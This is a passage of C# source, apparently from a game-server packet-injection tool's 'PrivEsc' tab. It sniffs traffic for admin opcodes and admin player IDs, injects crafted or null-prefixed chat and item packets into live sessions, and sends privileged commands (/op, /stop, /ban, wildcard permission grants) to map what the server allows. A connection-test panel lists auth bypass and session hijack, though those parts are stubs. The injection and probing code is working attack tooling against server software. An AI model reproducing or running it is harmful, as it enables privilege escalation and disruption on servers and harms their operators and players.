                    0x70 => "Admin opcode 0x70",
                    _ => $"Flagged opcode 0x{op:X2}",
                };
                _adminActions.Add(new AdminActionEntry
                {
                    Opcode    = op,
                    Direction = pkt.Direction,
                    Data      = (byte[])pkt.RawBytes.Clone(),
                    Reason    = reason,
                    At        = pkt.Timestamp,
                });
                AlertBus.Push(AlertBus.Sec_Privilege, AlertLevel.Warn,
                    $"Admin action captured: {reason}");
            }
        }

        // Cap lists
        while (_tokens.Count > 50)        _tokens.RemoveAt(0);
        while (_adminActions.Count > 100) _adminActions.RemoveAt(0);
    }

    private static float ShannonEntropy(byte[] data)
    {
        if (data.Length == 0) return 0;
        int[] freq = new int[256];
        foreach (byte b in data) freq[b]++;
        double e = 0, len = data.Length;
        for (int i = 0; i < 256; i++)
        {
            if (freq[i] == 0) continue;
            double p = freq[i] / len;
            e -= p * Math.Log2(p);
        }
        return (float)e;
    }

    // ══════════════════════════════════════════════════════════════════════
    // STATUS BAR + AUTO-FILL BAR
    // ══════════════════════════════════════════════════════════════════════

    private void RenderStatusBar(float w)
    {
        bool srv = _config.IsSet;
        bool ses = _capture.IsRunning || _udpProxy.IsRunning;

        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg2);
        ImGui.BeginChild("##privst", new Vector2(w, 30), ImGuiChildFlags.Border);
        ImGui.PopStyleColor();
        ImGui.SetCursorPos(new Vector2(12, 6));
        ImGui.PushStyleColor(ImGuiCol.Text, srv ? MenuRenderer.ColAccent : MenuRenderer.ColDanger);
        ImGui.TextUnformatted(srv
            ? $"[>] {_config.ServerIp}:{_config.ServerPort}"
            : "[>] No server - set in Dashboard");
        ImGui.PopStyleColor();
        ImGui.SameLine(0, 24);
        ImGui.PushStyleColor(ImGuiCol.Text, ses ? MenuRenderer.ColAccent : MenuRenderer.ColWarn);
        ImGui.TextUnformatted(ses
            ? "[>] Proxy active - injecting into live session"
            : "[>] No proxy - start Capture tab first");
        ImGui.PopStyleColor();
        if (_targetPlayerId > 0)
        {
            ImGui.SameLine(0, 24);
            ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
            ImGui.TextUnformatted($"[*] Targeting: ID {_targetPlayerId}" +
                (_targetPlayerName.Length > 0 ? $" ({_targetPlayerName})" : ""));
            ImGui.PopStyleColor();
        }
        ImGui.EndChild();
    }

    private void RenderAutoFillBar(float w)
    {
        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg2);
        ImGui.BeginChild("##privaf", new Vector2(w, 30), ImGuiChildFlags.Border);
        ImGui.PopStyleColor();
        ImGui.SetCursorPos(new Vector2(8, 5));

        UiHelper.SecondaryButton("[~] Auto-fill IDs from packets##privafbtn", 210, 22, () =>
        {
            _lastFill = ContextFiller.Fill(_capture, _udpProxy);
            if (_lastFill.HasItem)   _giItemId = (int)_lastFill.ItemId!.Value;  // ItemId is uint; safe cast (items < 2^31)
            if (_lastFill.HasPlayer)
            {
                int pid = (int)(_lastFill.PlayerId ?? 0u);
                if (pid > 0)
                {
                    _targetPlayerId  = pid;
                    _giPlayerId      = pid;
                    _ssAdminId       = pid;
                    _psWrappedId     = pid;
                    _hsPlayerIdInPkt = pid;
                }
                if (_lastFill.PlayerName != null)
                    _targetPlayerName = _lastFill.PlayerName;
            }
            bool got = _lastFill.HasItem || _lastFill.HasPlayer;
            _fillStatus = got
                ? $"Filled: Item={(_lastFill.HasItem ? _giItemId.ToString() : "-")}  " +
                  $"PlayerID={(_targetPlayerId > 0 ? _targetPlayerId.ToString() : "-")}  " +
                  $"Name={(_targetPlayerName.Length > 0 ? _targetPlayerName : "-")}"
                : "Nothing found - capture traffic first, then retry.";
            if (got) _log.Success($"[PrivEsc] Auto-filled - {_fillStatus}");
            else     _log.Warn("[PrivEsc] Auto-fill: no IDs found in recent packets.");
        });

        ImGui.SameLine(0, 14);
        ImGui.PushStyleColor(ImGuiCol.Text,
            _lastFill?.HasPlayer == true ? MenuRenderer.ColAccent : MenuRenderer.ColTextMuted);
        ImGui.TextUnformatted(_fillStatus);
        ImGui.PopStyleColor();
        ImGui.EndChild();
    }

    // ══════════════════════════════════════════════════════════════════════
    // ADMIN CANDIDATE DISCOVERY
    // ══════════════════════════════════════════════════════════════════════

    private List<AdminCandidate> BuildAdminCandidates(List<CapturedPacket> packets)
    {
        // Use PacketAnalyser schema discovery to find all Entity/Player ID candidates,
        // then supplement with ContextFiller player names
        var discovered = PacketAnalyser.AggregateAcrossPackets(packets, 300);

        var candidates = discovered
            .Where(d => d.TypeTag == "Entity/Player ID" && d.OccurrenceCount >= 2)
            .OrderByDescending(d => d.OccurrenceCount)
            .Take(12)
            .Select(d => new AdminCandidate
            {
                PlayerId = d.Value,
                Seen     = d.OccurrenceCount,
                Name     = null,
                Score    = d.Score,
            })
            .ToList();

        // Try to match player names from string guesses
        foreach (var pkt in Enumerable.Reverse(packets).Take(200))
        {
            var analysis = PacketAnalyser.Analyse(pkt);
            string? foundName = null;
            uint    foundId   = 0;

            foreach (var guess in analysis.Guesses)
            {
                if (guess.Name.StartsWith("Player Name") && guess.StrValue != null)
                    foundName = guess.StrValue;
                if (guess.Name.StartsWith("Entity/Player ID?"))
                    foundId = guess.IntValue >= 0 ? (uint)guess.IntValue : 0u;
            }

            if (foundName != null && foundId > 0)
            {
                var match = candidates.FirstOrDefault(c => c.PlayerId == foundId);
                if (match != null && match.Name == null)
                    match.Name = foundName;
            }
        }

        // Also include ContextFiller result if not already present
        var ctx = ContextFiller.Fill(_capture, _udpProxy);
        if (ctx.HasPlayer && ctx.PlayerId.HasValue)
        {
            if (!candidates.Any(c => c.PlayerId == ctx.PlayerId.Value))
            {
                candidates.Insert(0, new AdminCandidate
                {
                    PlayerId = ctx.PlayerId.Value,
                    Seen     = 1,
                    Name     = ctx.PlayerName,
                    Score    = 0,
                });
            }
        }

        return candidates;
    }

    // ══════════════════════════════════════════════════════════════════════
    // PACKET BUILDERS
    // ══════════════════════════════════════════════════════════════════════

    private byte[] BuildChatPacket(string command, bool nullPrefix)
    {
        string actual = nullPrefix ? "\0" + command : command;
        byte[] body   = Encoding.UTF8.GetBytes(actual);
        var pkt = new List<byte> { 0x01 };
        pkt.AddRange(BitConverter.GetBytes((ushort)body.Length));
        pkt.AddRange(body);
        return pkt.ToArray();
    }

    private byte[] BuildChatAppendPacket(byte[] original, string inject, bool nullDelim)
    {
        var pkt  = new List<byte>(original);
        if (nullDelim) pkt.Add(0x00);
        pkt.AddRange(Encoding.UTF8.GetBytes(inject));
        return pkt.ToArray();
    }

    private byte[] BuildItemEmbedPacket(byte[] original, string inject, bool nullDelim)
    {
        // Append the inject string at the end of the item packet
        var pkt = new List<byte>(original);
        if (nullDelim) pkt.Add(0x00);
        pkt.AddRange(Encoding.UTF8.GetBytes(inject));
        return pkt.ToArray();
    }

    // ══════════════════════════════════════════════════════════════════════
    // SHARED HELPERS
    // ══════════════════════════════════════════════════════════════════════

    /// Replace {target} with the selected admin's name or ID
    private string ResolveTarget(string s)
    {
        string t = _targetPlayerName.Length > 0 ? _targetPlayerName
                 : _targetPlayerId > 0          ? _targetPlayerId.ToString()
                 :                                "@s";
        return s.Replace("{target}", t);
    }

    /// Inline [~] auto-fill button (18x20) for beside input fields
    private void InlineAutoFill(string id, Action fill)
    {
        ImGui.PushStyleColor(ImGuiCol.Button, MenuRenderer.ColBg3);
        ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColTextMuted);
        if (ImGui.Button("[~]" + id, new Vector2(22, 22))) fill();
        if (ImGui.IsItemHovered()) ImGui.SetTooltip("Auto-fill from captured packets");
        ImGui.PopStyleColor(2);
        ImGui.SameLine(0, 8);
    }

    private static string BytesToHex(byte[] b, int maxBytes)
    {
        int take = Math.Min(maxBytes, b.Length);
        return string.Join(" ", b.Take(take).Select(x => $"{x:X2}"))
               + (b.Length > maxBytes ? "..." : "");
    }

    private static byte[] HexToBytes(string hex)
    {
        string clean = hex.Replace(" ", "").Replace("\n", "").Replace("\r", "");
        if (clean.Length % 2 != 0) clean += "0";
        return Convert.FromHexString(clean);
    }

    private static string PermName(int level) => level switch
    {
        0 => "Guest",
        1 => "Member",
        2 => "Moderator",
        3 => "Admin",
        4 => "Owner",
        _ => $"Level {level}",
    };

    private static Vector4 PermColor(int level) => level switch
    {
        0 or 1 => MenuRenderer.ColTextMuted,
        2       => MenuRenderer.ColBlue,
        3       => MenuRenderer.ColWarn,
        4       => MenuRenderer.ColDanger,
        _       => MenuRenderer.ColTextMuted,
    };

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: COMMAND RESPONSE TABLE
    // ══════════════════════════════════════════════════════════════════════
    //
    // Probes a matrix of permission nodes by sending test commands and
    // listening for the first server->client response packet after each one.
    // Classifies each result as ALLOW / DENY / SILENCE / KICK and builds
    // a live authorization-boundary table for documentation.

    // ── Probe definitions ─────────────────────────────────────────────────
    private static readonly ProbeEntry[] DefaultProbes =
    {
        // node label            command to send                        expected deny keyword
        new("world.edit",        "/setblock 0 64 0 stone",             "permission"),
        new("player.op",         "/op {target}",                       "not an operator"),
        new("player.gamemode",   "/gamemode creative {target}",        "permission"),
        new("player.give",       "/give {target} diamond 64",          "permission"),
        new("economy.admin",     "/eco give {target} 99999",           "permission"),
        new("server.stop",       "/stop",                              "permission"),
        new("server.reload",     "/reload",                            "permission"),
        new("chat.mute",         "/mute {target} 999",                 "permission"),
        new("chat.broadcast",    "/broadcast test_probe",              "permission"),
        new("admin.ban",         "/ban {target} probe",                "permission"),
        new("admin.kick",        "/kick {target} probe",               "permission"),
        new("admin.whitelist",   "/whitelist add probe_user",          "permission"),
        new("debug.dump",        "/dumpmemory",                        "unknown"),
        new("teleport.other",    "/tp {target} 0 64 0",               "permission"),
        new("perm.grant",        "/perm set {target} * true",         "permission"),
    };

    // ── State ─────────────────────────────────────────────────────────────
    private readonly List<ProbeEntry> _probes = DefaultProbes.Select(p => p.Clone()).ToList();
    private bool   _crtRunning       = false;
    private bool   _crtAutoFillTarget = true;
    private int    _crtProbeDelayMs  = 600;  // ms between each probe send
    private int    _crtListenMs      = 400;  // ms to wait for a server response
    private int    _crtCurrentProbe  = -1;   // index being probed right now
    private bool   _crtIncludeDisabled = false;
    private CancellationTokenSource? _crtCts;
    private string _crtSummary       = "";
    private int    _crtEditIdx       = -1;   // row being edited inline
    private string _crtNewNode       = "";
    private string _crtNewCmd        = "";
    private string _crtNewDenyKw     = "permission";

    // Inline edit buffers to avoid passing properties as ref (CS0206)
    private string _crtEditNode     = "";
    private string _crtEditCmdBuf   = "";
    private string _crtEditDenyBuf  = "";
    private int    _crtEditLoadedIdx = -1;

    private void RenderResponseTable(float w)
    {
        // ── Config bar ────────────────────────────────────────────────────
        UiHelper.SectionBox("PROBE CONFIGURATION", w, 100, () =>
        {
            UiHelper.MutedLabel("Sends each command in sequence and classifies the first server reply.");
            UiHelper.MutedLabel("Results build an authorization boundary map of this server's permission system.");
            ImGui.Spacing();

            ImGui.SetNextItemWidth(100); ImGui.InputInt("Probe delay ms##crtdly", ref _crtProbeDelayMs);
            _crtProbeDelayMs = Math.Clamp(_crtProbeDelayMs, 50, 10_000);
            ImGui.SameLine(0, 16);
            ImGui.SetNextItemWidth(100); ImGui.InputInt("Listen window ms##crtlms", ref _crtListenMs);
            _crtListenMs = Math.Clamp(_crtListenMs, 50, 5_000);
            ImGui.SameLine(0, 16);
            ImGui.Checkbox("Auto-fill target##crtaf",  ref _crtAutoFillTarget);
            ImGui.SameLine(0, 12);
            ImGui.Checkbox("Include disabled##crtid",  ref _crtIncludeDisabled);
            ImGui.SameLine(0, 16);

            if (_targetPlayerId > 0)
            {
                ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
                ImGui.TextUnformatted($"Target: {(_targetPlayerName.Length > 0 ? _targetPlayerName : _targetPlayerId > 0 ? _targetPlayerId.ToString() : "none")}");
                ImGui.PopStyleColor();
            }
        });

        ImGui.Spacing();

        // ── Run / Stop bar ────────────────────────────────────────────────
        if (_crtRunning)
        {
            UiHelper.DangerButton("STOP PROBE##crtstop", 130, 30, () =>
            {
                _crtCts?.Cancel();
                _crtRunning = false;
                _crtCurrentProbe = -1;
                _log.Warn("[CmdTable] Probe stopped by user.");
            });
            ImGui.SameLine(0, 12);
            if (_crtCurrentProbe >= 0 && _crtCurrentProbe < _probes.Count)
            {
                UiHelper.WarnText($"[>] Probing [{_crtCurrentProbe + 1}/{_probes.Count}]: " +
                                  _probes[_crtCurrentProbe].Node);
            }
        }
        else
        {
            UiHelper.WarnButton("RUN ALL PROBES##crtrun", 160, 30, RunProbes);
            ImGui.SameLine(0, 8);
            UiHelper.SecondaryButton("Reset Results##crtreset", 130, 30, () =>
            {
                foreach (var p in _probes) { p.Result = ProbeResult.Pending; p.RawResponse = ""; }
                _crtSummary = ""; _crtCurrentProbe = -1;
                _log.Info("[CmdTable] Results cleared.");
            });
            ImGui.SameLine(0, 8);
            UiHelper.SecondaryButton("Export Log##crtexp", 110, 30, ExportProbeLog);
        }

        if (_crtSummary.Length > 0)
        {
            ImGui.SameLine(0, 16);
            ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColBlue);
            ImGui.TextUnformatted(_crtSummary);
            ImGui.PopStyleColor();
        }

        ImGui.Spacing();

        // ── Results table ─────────────────────────────────────────────────
        float tableH = ImGui.GetContentRegionAvail().Y - 90f;
        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg1);
        ImGui.BeginChild("##crttbl", new Vector2(w, tableH), ImGuiChildFlags.Border);
        ImGui.PopStyleColor();

        // Column header
        ImGui.SetCursorPos(new Vector2(8, 4));
        UiHelper.MutedLabel($"  {"En",-4} {"Permission Node",-22} {"Command",-32} {"Result",-10} {"Response snippet"}");

        var dlh = ImGui.GetWindowDrawList();
        float hly = ImGui.GetCursorScreenPos().Y - 2;
        dlh.AddLine(new Vector2(ImGui.GetWindowPos().X, hly),
                    new Vector2(ImGui.GetWindowPos().X + w, hly),
                    ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColBorder));

        var dl = ImGui.GetWindowDrawList();

        for (int i = 0; i < _probes.Count; i++)
        {
            var p   = _probes[i];
            bool cur = _crtCurrentProbe == i;

            // Row highlight: current = amber dim; result colour otherwise
            if (cur)
            {
                var sp = ImGui.GetCursorScreenPos();
                dl.AddRectFilled(sp, sp + new Vector2(w, 22),
                    ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColWarnDim));
            }
            else if (p.Result != ProbeResult.Pending)
            {
                var sp  = ImGui.GetCursorScreenPos();
                var bgc = ResultDimColor(p.Result);
                dl.AddRectFilled(sp, sp + new Vector2(w, 22),
                    ImGui.ColorConvertFloat4ToU32(bgc));
            }

            // Enable checkbox
            ImGui.SetCursorPosX(8);
            bool en = p.Enabled;
            if (ImGui.Checkbox($"##cren{i}", ref en)) p.Enabled = en;
            ImGui.SameLine(0, 4);

            // Node + command (selectable, expands edit form)
            ImGui.PushStyleColor(ImGuiCol.Text, ResultColor(p.Result));
            if (ImGui.Selectable(
                $"  {p.Node,-22} {p.Command[..Math.Min(30, p.Command.Length)].Replace("{target}", "..."),-32}" +
                $" {ResultLabel(p.Result),-10} {p.RawResponse[..Math.Min(40, p.RawResponse.Length)]}##crtsel{i}",
                _crtEditIdx == i, ImGuiSelectableFlags.None, new Vector2(w - 60, 22)))
                _crtEditIdx = _crtEditIdx == i ? -1 : i;
            ImGui.PopStyleColor();

            // Probe single row button
            ImGui.SameLine(w - 56);
            ImGui.PushStyleColor(ImGuiCol.Button, MenuRenderer.ColBg3);
            ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColTextMuted);
            if (ImGui.Button($">##crtp{i}", new Vector2(24, 20)) && !_crtRunning)
                ProbeSingle(i);
            ImGui.PopStyleColor(2);

            // Delete button
            ImGui.SameLine(0, 4);
            ImGui.PushStyleColor(ImGuiCol.Button, MenuRenderer.ColBg3);
            ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColDanger);
            if (ImGui.Button($"[x]##crtdel{i}", new Vector2(24, 20)))
            {
                _probes.RemoveAt(i);
                if (_crtEditIdx == i) _crtEditIdx = -1;
                i--;
            }
            ImGui.PopStyleColor(2);

            // Inline edit form
            if (_crtEditIdx == i && i < _probes.Count)
            {
                ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg2);
                ImGui.BeginChild($"##crtedit{i}", new Vector2(w - 10, 90), ImGuiChildFlags.Border);
                ImGui.PopStyleColor();
                ImGui.SetCursorPos(new Vector2(6, 6));

                // Initialize edit buffers once when this row is opened for editing
                if (_crtEditLoadedIdx != i)
                {
                    _crtEditNode    = p.Node;
                    _crtEditCmdBuf  = p.Command;
                    _crtEditDenyBuf = p.DenyKeyword;
                    _crtEditLoadedIdx = i;
                }

                ImGui.SetNextItemWidth(180);
                if (ImGui.InputText($"Node##crten{i}", ref _crtEditNode, 48))
                    p.Node = _crtEditNode;

                ImGui.SameLine(0, 8);
                ImGui.SetNextItemWidth(300);
                if (ImGui.InputText($"Command##crtec{i}", ref _crtEditCmdBuf, 128))
                    p.Command = _crtEditCmdBuf;

                ImGui.SameLine(0, 8);
                ImGui.SetNextItemWidth(160);
                if (ImGui.InputText($"Deny kw##crtdk{i}", ref _crtEditDenyBuf, 48))
                    p.DenyKeyword = _crtEditDenyBuf;

                ImGui.SetCursorPosX(6);
                UiHelper.MutedLabel("Use {target} - replaced with the admin name/ID from the sidebar.");
                if (p.RawResponse.Length > 0)
                {
                    ImGui.SetCursorPosX(6);
                    ImGui.PushStyleColor(ImGuiCol.Text, ResultColor(p.Result));
                    ImGui.TextUnformatted($"Last response: {p.RawResponse}");
                    ImGui.PopStyleColor();
                }
                ImGui.EndChild();

                // If editing closed on a different row, reset loaded index
                if (_crtEditIdx != i) _crtEditLoadedIdx = -1;
            }
        }

        ImGui.EndChild();

        // ── Add new probe row ─────────────────────────────────────────────
        ImGui.Spacing();
        UiHelper.SectionBox("ADD PROBE", w, 60, () =>
        {
            ImGui.SetNextItemWidth(160); ImGui.InputText("Node##crtnewn",   ref _crtNewNode,    48);
            ImGui.SameLine(0, 8);
            ImGui.SetNextItemWidth(280); ImGui.InputText("Command##crtnewc", ref _crtNewCmd,   128);
            ImGui.SameLine(0, 8);
            ImGui.SetNextItemWidth(140); ImGui.InputText("Deny kw##crtnewd", ref _crtNewDenyKw, 48);
            ImGui.SameLine(0, 8);
            ImGui.BeginDisabled(string.IsNullOrWhiteSpace(_crtNewNode) || string.IsNullOrWhiteSpace(_crtNewCmd));
            UiHelper.PrimaryButton("Add##crtnew", 50, 22, () =>
            {
                _probes.Add(new ProbeEntry(_crtNewNode, _crtNewCmd, _crtNewDenyKw));
                _log.Info($"[CmdTable] Added probe: {_crtNewNode}");
                _crtNewNode = _crtNewCmd = ""; _crtNewDenyKw = "permission";
            });
            ImGui.EndDisabled();
        });
    }

    // ── Probe runner ──────────────────────────────────────────────────────

    private void RunProbes()
    {
        if (_crtRunning) return;
        _crtRunning = true;
        _crtCts = new CancellationTokenSource();
        var cts = _crtCts;

        // Resolve target once
        string target = _crtAutoFillTarget && _targetPlayerId > 0
            ? (_targetPlayerName.Length > 0 ? _targetPlayerName : _targetPlayerId.ToString())
            : "@s";

        var toRun = _probes
            .Select((p, i) => (p, i))
            .Where(t => t.p.Enabled || _crtIncludeDisabled)
            .ToList();

        _log.Info($"[CmdTable] Starting {toRun.Count} probes - target='{target}'");

        Task.Run(async () =>
        {
            int allow = 0, deny = 0, silence = 0, kick = 0;

            foreach (var (probe, idx) in toRun)
            {
                if (cts.IsCancellationRequested) break;
                _crtCurrentProbe = idx;
                probe.Result = ProbeResult.Probing;
                probe.RawResponse = "";

                // Record packet count before probe
                int pktsBefore = _capture.GetPackets().Count;

                // Send the probe command
                string cmd = probe.Command.Replace("{target}", target);
                try
                {
                    byte[] pkt = BuildChatPacket(cmd, false);
                    SendRaw(pkt);
                    _log.Info($"[CmdTable] [{idx+1}/{_probes.Count}] Sent: {cmd}");
                }
                catch (Exception ex)
                {
                    probe.Result      = ProbeResult.Error;
                    probe.RawResponse = ex.Message;
                    _log.Error($"[CmdTable] Send failed for '{probe.Node}': {ex.Message}");
                    await Task.Delay(_crtProbeDelayMs);
                    continue;
                }

                // Wait for listen window, then examine new S->C packets
                await Task.Delay(_crtListenMs);

                var newPkts = _capture.GetPackets()
                    .Skip(pktsBefore)
                    .Where(p => p.Direction == PacketDirection.ServerToClient)
                    .ToList();

                if (newPkts.Count == 0)
                {
                    probe.Result      = ProbeResult.Silence;
                    probe.RawResponse = "(no server response)";
                    silence++;
                }
                else
                {
                    // Extract readable text from the first response packet
                    string responseText = ExtractText(newPkts[0].RawBytes);
                    probe.RawResponse  = responseText;

                    string lower = responseText.ToLower();

                    if (lower.Contains("kick") || lower.Contains("banned") || lower.Contains("disconnect"))
                    {
                        probe.Result = ProbeResult.Kick;
                        kick++;
                    }
                    else if (!string.IsNullOrEmpty(probe.DenyKeyword) &&
                             lower.Contains(probe.DenyKeyword.ToLower()))
                    {
                        probe.Result = ProbeResult.Deny;
                        deny++;
                    }
                    else if (lower.Length > 2)
                    {
                        probe.Result = ProbeResult.Allow;
                        allow++;
                    }
                    else
                    {
                        probe.Result = ProbeResult.Silence;
                        silence++;
                    }
                }

                _log.Info($"[CmdTable] '{probe.Node}' -> {ResultLabel(probe.Result)}: {probe.RawResponse}");
                await Task.Delay(Math.Max(0, _crtProbeDelayMs - _crtListenMs));
            }

            _crtRunning      = false;
            _crtCurrentProbe = -1;
            _crtSummary = $"Done - ALLOW:{allow}  DENY:{deny}  SILENCE:{silence}  KICK:{kick}";
            _log.Success($"[CmdTable] Probe complete. {_crtSummary}");
        });
    }

    private void ProbeSingle(int idx)
    {
        if (idx < 0 || idx >= _probes.Count || _crtRunning) return;
        var probe  = _probes[idx];
        string target = _targetPlayerName.Length > 0 ? _targetPlayerName
                      : _targetPlayerId > 0 ? _targetPlayerId.ToString() : "@s";
        string cmd = probe.Command.Replace("{target}", target);

        probe.Result = ProbeResult.Probing;
        probe.RawResponse = "";
        _crtCurrentProbe = idx;

        int pktsBefore = _capture.GetPackets().Count;
        try { SendRaw(BuildChatPacket(cmd, false)); }
        catch (Exception ex) { probe.Result = ProbeResult.Error; probe.RawResponse = ex.Message; return; }

        Task.Run(async () =>
        {
            await Task.Delay(_crtListenMs);
            var newPkts = _capture.GetPackets()
                .Skip(pktsBefore)
                .Where(p => p.Direction == PacketDirection.ServerToClient)
                .ToList();

            if (newPkts.Count == 0)
            { probe.Result = ProbeResult.Silence; probe.RawResponse = "(no response)"; }
            else
            {
                string txt   = ExtractText(newPkts[0].RawBytes);
                string lower = txt.ToLower();
                probe.RawResponse = txt;
                probe.Result = lower.Contains("kick") || lower.Contains("disconnect") ? ProbeResult.Kick
                             : !string.IsNullOrEmpty(probe.DenyKeyword) && lower.Contains(probe.DenyKeyword.ToLower()) ? ProbeResult.Deny
                             : txt.Length > 2 ? ProbeResult.Allow
                             : ProbeResult.Silence;
            }
            _crtCurrentProbe = -1;
            _log.Info($"[CmdTable] Single '{probe.Node}' -> {ResultLabel(probe.Result)}");
        });
    }

    private void ExportProbeLog()
    {
        var sb = new System.Text.StringBuilder();
        sb.AppendLine($"# Command Response Table  -  {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        sb.AppendLine($"# Target: {(_targetPlayerName.Length > 0 ? _targetPlayerName : _targetPlayerId > 0 ? _targetPlayerId.ToString() : "none")}");
        sb.AppendLine();
        sb.AppendLine($"{"Permission Node",-24} {"Result",-10} Response");
        sb.AppendLine(new string('-', 80));
        foreach (var p in _probes)
            sb.AppendLine($"{p.Node,-24} {ResultLabel(p.Result),-10} {p.RawResponse}");

        ImGui.SetClipboardText(sb.ToString());
        _log.Success("[CmdTable] Results copied to clipboard.");
    }

    // ── Helpers ───────────────────────────────────────────────────────────

    private static string ExtractText(byte[] data)
    {
        var sb = new System.Text.StringBuilder();
        foreach (byte b in data)
            if (b >= 32 && b < 127) sb.Append((char)b);
            else if (b == 0 && sb.Length > 0) sb.Append(' ');
        return sb.ToString().Trim();
    }

    private static string ResultLabel(ProbeResult r) => r switch
    {
        ProbeResult.Allow   => "ALLOW",
        ProbeResult.Deny    => "DENY",
        ProbeResult.Silence => "SILENCE",
        ProbeResult.Kick    => "KICK",
        ProbeResult.Probing => "...",
        ProbeResult.Error   => "ERROR",
        _                   => "pending",
    };

    private static Vector4 ResultColor(ProbeResult r) => r switch
    {
        ProbeResult.Allow   => MenuRenderer.ColDanger,   // red = dangerous, server allowed
        ProbeResult.Deny    => MenuRenderer.ColAccent,   // green = server correctly denied
        ProbeResult.Silence => MenuRenderer.ColTextMuted,
        ProbeResult.Kick    => MenuRenderer.ColWarn,     // amber = server kicked (strong response)
        ProbeResult.Probing => MenuRenderer.ColBlue,
        ProbeResult.Error   => MenuRenderer.ColDanger,
        _                   => MenuRenderer.ColTextMuted,
    };

    private static Vector4 ResultDimColor(ProbeResult r) => r switch
    {
        ProbeResult.Allow   => MenuRenderer.ColDangerDim,
        ProbeResult.Deny    => MenuRenderer.ColAccentDim,
        ProbeResult.Kick    => MenuRenderer.ColWarnDim,
        _                   => new Vector4(0, 0, 0, 0),
    };

    // ══════════════════════════════════════════════════════════════════════
    // CONN TESTS  (merged from ConnectionTab)
    // ══════════════════════════════════════════════════════════════════════

    private void RenderConnTests(float w)
    {
        float half = (w - 12) * 0.5f;

        UiHelper.SectionBox("TEST SELECTION", half, 210, () =>
        {
            UiHelper.MutedLabel("Select connection-level attack tests to run:");
            ImGui.Spacing();
            ImGui.Checkbox("Handshake Tampering##ct_ht",  ref _ctHandshakeTamper);
            UiHelper.MutedLabel("  Sends a malformed handshake to probe auth bypass.");
            ImGui.Spacing();
            ImGui.Checkbox("Auth Bypass Test##ct_ab",     ref _ctAuthBypass);
            UiHelper.MutedLabel("  Replays an auth packet with a modified token.");
            ImGui.Spacing();
            ImGui.Checkbox("Session Hijack##ct_sh",       ref _ctSessionHijack);
            UiHelper.MutedLabel("  Injects a fake session ID mid-flow.");
            ImGui.Spacing();
            ImGui.Checkbox("Timeout Behaviour##ct_tb",    ref _ctTimeoutTest);
            UiHelper.MutedLabel("  Sends nothing and measures server keep-alive.");
        });

        ImGui.SameLine(0, 12);

        UiHelper.SectionBox("PARAMETERS", half, 210, () =>
        {
            UiHelper.MutedLabel("Test parameters:");
            ImGui.Spacing();
            ImGui.SetNextItemWidth(160);
            ImGui.InputInt("Fake Session ID##ct_fs", ref _ctFakeSessionId);
            ImGui.Spacing();
            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("Fake Token##ct_ft", ref _ctFakeToken, 128);
            ImGui.Spacing();
            ImGui.SetNextItemWidth(120);
            ImGui.InputInt("Timeout ms##ct_to", ref _ctTimeoutMs);
            _ctTimeoutMs = Math.Clamp(_ctTimeoutMs, 100, 120_000);
        });

        ImGui.Spacing(); ImGui.Spacing();

        UiHelper.SectionBox("RUN", w, 80, () =>
        {
            UiHelper.WarnButton("Run Connection Tests", 200, 34, () =>
            {
                if (!_config.IsSet)
                { _log.Error("[Conn] No server set — go to Dashboard first."); return; }

                _log.Info($"[Conn] Testing {_config.ServerIp}:{_config.ServerPort}");
                if (_ctHandshakeTamper) _log.Warn("[Conn] Handshake tamper — stub");
                if (_ctAuthBypass)      _log.Warn("[Conn] Auth bypass — stub");
                if (_ctSessionHijack)   _log.Warn($"[Conn] Session hijack (ID={_ctFakeSessionId}, token={_ctFakeToken}) — stub");
                if (_ctTimeoutTest)     _log.Warn($"[Conn] Timeout test ({_ctTimeoutMs} ms) — stub");
                _log.Success("[Conn] Tests dispatched.");
            });

            ImGui.SameLine(0, 12);
            ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColTextMuted);
            ImGui.TextUnformatted(_config.IsSet
                ? $"-> {_config.ServerIp}:{_config.ServerPort}"
                : "Set server in Dashboard first");
            ImGui.PopStyleColor();
        });

        ImGui.Spacing();
        RenderHowTo(
            "Go to Dashboard and set your target server IP + port.",
            "Enable the tests you want to run above.",
            "Set Fake Session ID / Token to values observed from a real capture.",
            "Click Run — results appear in the Log tab."
        );
    }

    private void RenderHowTo(params string[] steps)
    {
        ImGui.Spacing();
        float w = ImGui.GetContentRegionAvail().X;
        UiHelper.SectionBox("HOW TO USE", w, 32 + steps.Length * 20, () =>
        {
            foreach (var s in steps) UiHelper.MutedLabel(s);
        });
    }

    private void SendRaw(byte[] data)
    {
        if (_udpProxy.IsRunning && _udpProxy.InjectToServer(data))
        { _log.Info($"[PrivEsc] {data.Length}b injected via UDP proxy."); return; }

        bool ok = _capture.InjectToServer(data).GetAwaiter().GetResult();
        if (ok) { _log.Info($"[PrivEsc] {data.Length}b injected via TCP."); return; }

        _log.Warn("[PrivEsc] No live session - sending direct UDP...");
        try
        {
            using var udp = new UdpClient();
            udp.Connect(_config.ServerIp, _config.ServerPort);
            udp.Send(data, data.Length);
            _log.Info($"[PrivEsc] {data.Length}b sent via direct UDP.");
        }
        catch (Exception ex) { _log.Error($"[PrivEsc] {ex.Message}"); }
    }
}

// ── Probe types ─────────────────────────────────────────────────────────────

public enum ProbeResult { Pending, Probing, Allow, Deny, Silence, Kick, Error }

public class ProbeEntry
{
    public string      Node        { get; set; }
    public string      Command     { get; set; }
    public string      DenyKeyword { get; set; }
    public ProbeResult Result      { get; set; } = ProbeResult.Pending;
    public string      RawResponse { get; set; } = "";
    public bool        Enabled     { get; set; } = true;

    public ProbeEntry(string node, string command, string denyKeyword)
    {
        Node = node; Command = command; DenyKeyword = denyKeyword;
    }

    public ProbeEntry Clone() => new(Node, Command, DenyKeyword) { Enabled = Enabled };
}

